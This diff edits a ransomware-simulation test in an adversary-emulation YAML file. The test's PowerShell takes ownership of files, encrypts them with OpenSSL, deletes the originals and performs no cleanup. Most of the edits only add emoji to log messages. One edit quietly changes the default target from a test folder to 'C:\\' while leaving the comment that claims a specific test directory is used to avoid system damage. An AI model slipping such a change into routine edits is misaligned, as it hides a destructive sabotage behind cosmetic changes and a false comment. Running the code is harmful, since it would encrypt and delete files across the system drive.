@@ -16,7 +16,7 @@ atomic_tests:
       target_directory:
         description: Directory to encrypt and delete files from
         type: path
-        default: "C:\\test_files\\"  # Use a specific test directory to avoid system damage
+        default: "C:\\"  # Use a specific test directory to avoid system damage
       target_extensions:
         description: List of file extensions to target for encryption
         type: array
@@ -97,46 +97,46 @@ atomic_tests:
 
         # Validate target directory
         if (-Not (Test-Path $targetDir)) {
-            Write-Host "The target directory $targetDir does not exist."
+            Write-Host "❌ The target directory $targetDir does not exist."
             exit 1
         }
 
-        Write-Host "=== Starting encryption process ==="
+        Write-Host "✅ Starting encryption process..."
 
         # Encrypt files recursively
         Get-ChildItem -Path $targetDir -Recurse -Include $includeClause -ErrorAction SilentlyContinue | ForEach-Object {
             $file = $_.FullName
 
             # Log the current file being processed
-            Write-Host "Processing file: $file"
+            Write-Host "🔍 Processing file: $file"
 
             # Take ownership and modify permissions
             try {
                 takeown /F $file /A
                 icacls $file /grant Administrators:F /T /C
-                Write-Host "Permissions modified successfully for: $file"
+                Write-Host "🔑 Permissions modified successfully for: $file"
             } catch {
-                Write-Host "Failed to modify permissions for file: $file"
+                Write-Host "❌ Failed to modify permissions for file: $file"
                 return
             }
 
             # Encrypt the file with OpenSSL
             $encryptedFile = "$file.enc"
-            Write-Host "Encrypting file: $file -> $encryptedFile"
+            Write-Host "🔒 Encrypting file: $file -> $encryptedFile"
             openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
             
             if ($LASTEXITCODE -eq 0) {
-                Write-Host "Successfully encrypted: $file -> $encryptedFile"
+                Write-Host "✅ Successfully encrypted: $file -> $encryptedFile"
                 
                 # Delete the original file after successful encryption
                 Remove-Item -Path $file -Force
-                Write-Host "Deleted original file: $file"
+                Write-Host "🗑️ Deleted original file: $file"
             } else {
-                Write-Host "Failed to encrypt: $file"
+                Write-Host "❌ Failed to encrypt: $file"
             }
         }
 
-        Write-Host "=== Encryption and deletion process completed ==="
+        Write-Host "✅ Encryption and deletion process completed!"
       cleanup_command: |
         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
         # Note: Ensure that the decryption password is securely stored and accessible.
